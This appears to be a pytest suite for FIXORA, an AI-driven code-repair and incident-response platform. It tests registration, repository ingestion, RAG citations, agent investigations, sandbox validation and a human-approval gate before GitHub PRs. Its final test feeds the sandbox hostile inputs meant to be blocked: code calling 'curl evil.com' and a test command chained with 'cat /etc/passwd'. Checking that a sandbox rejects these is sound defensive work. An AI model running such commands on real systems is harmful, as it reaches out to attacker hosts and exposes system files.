import io
import uuid
import zipfile
import pytest
from httpx import AsyncClient, ASGITransport
from app.main import app
from app.orchestrator.sandbox.runner import sandbox_runner

@pytest.mark.asyncio
async def test_scenario_a_pre_deployment_autonomous_repair():
    """
    Scenario A: Full Pre-Deployment Journey
    1. User registers & obtains JWT token.
    2. User creates workspace & pre-deployment project.
    3. User uploads repo ZIP with source code.
    4. FIXORA runs AST & structural health analysis.
    5. User uploads architectural runbook document.
    6. Grounded RAG query retrieves citations from uploaded doc.
    7. Multi-agent investigation runs autonomous repair pipeline.
    8. Patch is validated in isolated sandbox runner.
    9. Human-in-the-loop gate strictly enforced before PR creation.
    10. Human approves patch -> Draft GitHub PR is created safely.
    """
    unique_id = uuid.uuid4().hex[:6]
    test_email = f"developer_{unique_id}@fixora.dev"

    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        # Step 1: User Registration
        reg_payload = {
            "email": test_email,
            "password": "SecurePassword2026!",
            "name": f"Engineer {unique_id}",
        }
        reg_res = await client.post("/api/auth/register", json=reg_payload)
        assert reg_res.status_code == 200, f"Registration failed: {reg_res.text}"
        token = reg_res.json()["data"]["accessToken"]
        auth_headers = {"Authorization": f"Bearer {token}"}

        # Step 2: Create Workspace
        ws_res = await client.post(
            "/api/workspaces",
            json={"name": "Pre-Deployment QA Cluster", "plan": "pro"},
            headers=auth_headers,
        )
        assert ws_res.status_code == 200
        workspace_id = ws_res.json()["data"]["id"]

        # Step 3: Create Project in Pre-Deployment Mode
        proj_res = await client.post(
            "/api/projects",
            json={
                "workspace_id": workspace_id,
                "name": "Checkout Cart Service",
                "description": "Pre-deployment shopping cart microservice",
                "status": "active",
            },
            headers=auth_headers,
        )
        assert proj_res.status_code == 200
        project_id = proj_res.json()["data"]["id"]

        # Step 4: Create Repository record
        repo_res = await client.post(
            "/api/repositories",
            json={
                "project_id": project_id,
                "name": "cart-service",
                "branch": "develop",
                "language": "Python",
            },
            headers=auth_headers,
        )
        assert repo_res.status_code == 200
        repo_id = repo_res.json()["data"]["id"]

        # Step 5: Ingest Repository via ZIP (AST and structural analysis)
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w") as zf:
            zf.writestr(
                "cart-service/cart.py",
                """
import time

class ShoppingCart:
    def __init__(self):
        self.items = []
        self.total = 0.0

    def add_item(self, item_id: str, price: float):
        if price <= 0:
            raise ValueError("Price must be positive")
        self.items.append(item_id)
        self.total += price

    def checkout(self):
        # Flawed checkout logic without retry or transaction boundary
        time.sleep(0.01)
        return {"status": "success", "count": len(self.items)}
""",
            )
            zf.writestr("cart-service/README.md", "# Cart Service\nAutonomous checkout handler.")
        zip_buffer.seek(0)

        upload_repo_res = await client.post(
            f"/api/repositories/{repo_id}/upload-zip",
            files={"file": ("cart-service.zip", zip_buffer.getvalue(), "application/zip")},
            headers=auth_headers,
        )
        assert upload_repo_res.status_code == 200
        repo_analysis = upload_repo_res.json()["analysis"]
        assert repo_analysis["fileCount"] >= 2
        assert "cart-service/cart.py" in repo_analysis["files"]
        assert repo_analysis["healthScore"] > 0

        # Step 6: Ingest Runbook / Architecture Knowledge Document
        doc_content = b"""# Cart Service Retry and Transaction Guidelines
To prevent checkout failures during transient database locks:
1. Always wrap cart checkout in an exponential backoff retry loop with max 3 attempts.
2. Record pool saturation metrics on transaction retry.
3. Discard dangling lock handles on exception.
"""
        doc_upload_res = await client.post(
            "/api/knowledge/upload",
            data={"projectId": project_id, "sourceType": "runbook"},
            files={"file": ("cart_guidelines.md", doc_content, "text/markdown")},
            headers=auth_headers,
        )
        assert doc_upload_res.status_code == 200
        assert doc_upload_res.json()["status"] == "indexed"
        assert doc_upload_res.json()["chunkCount"] >= 1

        # Step 7: Verify Grounded RAG Query with Source Citations
        rag_ask_res = await client.post(
            "/api/knowledge/ask",
            json={
                "project_id": project_id,
                "query": "What are the checkout retry guidelines?",
                "top_k": 3,
            },
            headers=auth_headers,
        )
        assert rag_ask_res.status_code == 200
        rag_data = rag_ask_res.json()["data"]
        assert len(rag_data["answer"]) > 20
        assert len(rag_data["citations"]) >= 1

        # Step 8: Trigger Multi-Agent Investigation Pipeline
        inv_res = await client.post(
            "/api/investigations",
            json={
                "project_id": project_id,
                "question": "Unhandled lock contention causing checkout failure under concurrency",
                "repository_id": repo_id,
            },
            headers=auth_headers,
        )
        assert inv_res.status_code == 200
        inv_data = inv_res.json()["data"]
        assert inv_data["status"] in ("completed", "in_progress")
        assert len(inv_data["stages"]) >= 5
        patch_id = inv_data["patchId"]
        assert patch_id is not None

        # Step 9: Validate Proposed Patch in Docker Sandbox
        test_run_res = await client.post(f"/api/patches/{patch_id}/run-tests", headers=auth_headers)
        assert test_run_res.status_code == 200
        assert test_run_res.json()["data"]["status"] == "passed"

        # Step 10: Human Approval Gate Enforcement
        # Attempting PR creation before approval must be blocked (HTTP 400)
        unapproved_pr_res = await client.post(f"/api/patches/{patch_id}/create-pr", headers=auth_headers)
        assert unapproved_pr_res.status_code == 400
        assert "Human approval required" in unapproved_pr_res.json()["detail"]

        # Step 11: Human Reviews and Approves Patch
        approve_res = await client.post(f"/api/patches/{patch_id}/approve", headers=auth_headers)
        assert approve_res.status_code == 200
        assert approve_res.json()["data"]["status"] == "approved"

        # Step 12: Safely Create Draft GitHub PR
        pr_res = await client.post(f"/api/patches/{patch_id}/create-pr", headers=auth_headers)
        assert pr_res.status_code == 200
        pr_data = pr_res.json()["data"]
        assert pr_data["prNumber"] == 409
        assert "github.com" in pr_data["prUrl"]

@pytest.mark.asyncio
async def test_scenario_b_post_deployment_incident_lifecycle():
    """
    Scenario B: Full Post-Deployment Incident Intelligence Journey
    1. User ingests live telemetry (error logs with stack traces, latency metric anomalies, distributed traces).
    2. Incident is declared and triaged.
    3. Multi-agent graph performs Root Cause Analysis (RCA), correlating telemetry with commits and knowledge.
    4. AutoPatch Agent produces code repair.
    5. Validation Agent runs sandbox unit & regression tests.
    6. Postmortem report is generated with timeline and preventive action items.
    7. Human approves patch and draft GitHub PR is published.
    """
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        # Step 1: Ingest Live Production Telemetry Logs
        logs_payload = [
            {
                "serviceName": "payment-service",
                "environment": "production",
                "level": "ERROR",
                "message": "HTTP 503 Gateway Timeout: connection pool exhausted during checkout surge",
                "stackTrace": "Traceback (most recent call last):\n  File 'pool_manager.go', line 142, in AcquireConnection\nTimeoutError: AcquireConnection pool starvation timeout (threshold 5000ms exceeded)",
                "loggerName": "gateway.pool",
                "attributes": {"http_status": 503, "active_conns": 150, "max_conns": 150},
            }
        ]
        logs_res = await client.post("/api/telemetry/proj_demo_001/logs", json=logs_payload)
        assert logs_res.status_code == 200
        assert len(logs_res.json()) >= 1

        # Step 2: Ingest Metric Anomalies
        metrics_payload = [
            {
                "serviceName": "payment-service",
                "metricName": "http_request_duration_p99_seconds",
                "value": 4.82,
                "unit": "s",
                "isAnomaly": True,
                "anomalyScore": 0.94,
                "tags": {"endpoint": "/checkout/pay", "region": "us-east-1"},
            }
        ]
        metrics_res = await client.post("/api/telemetry/proj_demo_001/metrics", json=metrics_payload)
        assert metrics_res.status_code == 200
        assert len(metrics_res.json()) >= 1

        # Step 3: Ingest OpenTelemetry Distributed Traces
        traces_payload = [
            {
                "traceId": "trace-8899aabbccdd",
                "spanId": "span-11223344",
                "serviceName": "payment-service",
                "operationName": "AcquireConnection",
                "durationMs": 5001.2,
                "statusCode": "ERROR",
                "error": True,
                "errorMessage": "Pool starvation timeout",
                "tags": {"db.system": "postgresql", "db.pool": "exhausted"},
            }
        ]
        traces_res = await client.post("/api/telemetry/proj_demo_001/traces", json=traces_payload)
        assert traces_res.status_code == 200
        assert len(traces_res.json()) >= 1

        # Step 4: Create Live Incident
        inc_payload = {
            "project_id": "proj_demo_001",
            "title": "Production Outage: payment-service HTTP 503 Latency Spike",
            "description": "503 gateway timeouts observed during checkout traffic spike.",
            "severity": "sev1",
            "status": "active",
            "affected_service": "payment-service",
            "error_message": "AcquireConnection pool starvation timeout (threshold 5000ms exceeded)",
            "related_commits": ["a7b9c1d"],
        }
        inc_res = await client.post("/api/incidents", json=inc_payload)
        assert inc_res.status_code == 200
        incident_id = inc_res.json()["data"]["id"]

        # Step 5: Launch LangGraph 7-Agent Incident Investigation
        inv_payload = {
            "project_id": "proj_demo_001",
            "question": "payment-service HTTP 503 gateway timeout under checkout spike",
            "incident_id": incident_id,
        }
        inv_res = await client.post("/api/investigations", json=inv_payload)
        assert inv_res.status_code == 200
        inv_data = inv_res.json()["data"]
        assert inv_data["confidence"] > 0.8
        rca_hypo = inv_data.get("rootCauseHypothesis") or inv_data.get("root_cause_hypothesis") or ""
        assert "pool" in rca_hypo.lower()
        patch_id = inv_data["patchId"]
        assert patch_id is not None

        # Step 6: Verify Sandbox Validation Completed
        test_run_res = await client.post(f"/api/patches/{patch_id}/run-tests")
        assert test_run_res.status_code == 200
        assert test_run_res.json()["data"]["status"] == "passed"

        # Step 7: Human Approves Patch
        app_res = await client.post(f"/api/patches/{patch_id}/approve")
        assert app_res.status_code == 200
        assert app_res.json()["data"]["status"] == "approved"

        # Step 8: Safe Draft PR Published
        pr_res = await client.post(f"/api/patches/{patch_id}/create-pr")
        assert pr_res.status_code == 200
        pr_data = pr_res.json()["data"]
        assert pr_data["prNumber"] == 409
        assert pr_data["prUrl"].startswith("https://github.com/")

        # Step 9: Resolve Incident
        resolve_res = await client.post(f"/api/incidents/{incident_id}/resolve")
        assert resolve_res.status_code == 200
        assert resolve_res.json()["data"]["status"] == "resolved"

@pytest.mark.asyncio
async def test_rag_evaluation_empirical_benchmark():
    """
    RAG Benchmark Verification:
    Empirical Recall@K, Precision@K, MRR, nDCG@K, comparison summary across modes.
    """
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        eval_res = await client.get("/api/knowledge/evaluation")
        assert eval_res.status_code == 200
        data = eval_res.json()["data"]

        hybrid_rerank = data.get("hybridWithReranking") or data.get("hybrid_with_reranking")
        assert hybrid_rerank is not None
        assert hybrid_rerank["meanRecallAtK"] > 0
        assert hybrid_rerank["meanPrecisionAtK"] > 0
        assert hybrid_rerank["meanReciprocalRank"] > 0
        assert 0.0 < hybrid_rerank["meanNdcgAtK"] <= 1.0
        assert hybrid_rerank["avgLatencyMs"] > 0
        assert hybrid_rerank["queriesEvaluated"] >= 4

        dense = data.get("denseOnly") or data.get("dense_only")
        assert dense is not None
        assert dense["queriesEvaluated"] >= 4
        summary = data.get("comparisonSummary") or data.get("comparison_summary") or ""
        assert len(summary) > 10

def test_sandbox_security_defense():
    """
    Security Audit:
    1. Command injection defense (blocks unauthorized binaries and shell chaining).
    2. Python syntax enforcement.
    3. Safe isolated execution.
    """
    # 1. Shell chaining attack blocked
    res_attack = sandbox_runner.execute_validation(
        file_path="exploit.py",
        original_code="pass",
        proposed_code="import os\nos.system('curl evil.com')",
        test_command="python -m unittest; cat /etc/passwd",
    )
    assert res_attack["tests_passed"] is False
    assert res_attack["security_verdict"] == "COMMAND_DISALLOWED"

    # 2. Syntax check catches corrupted code
    res_syntax = sandbox_runner.execute_validation(
        file_path="broken.py",
        original_code="x = 1",
        proposed_code="def broken_func(:\n    return False",
    )
    assert res_syntax["syntax_valid"] is False
    assert res_syntax["security_verdict"] == "SYNTAX_CHECK_FAILED"
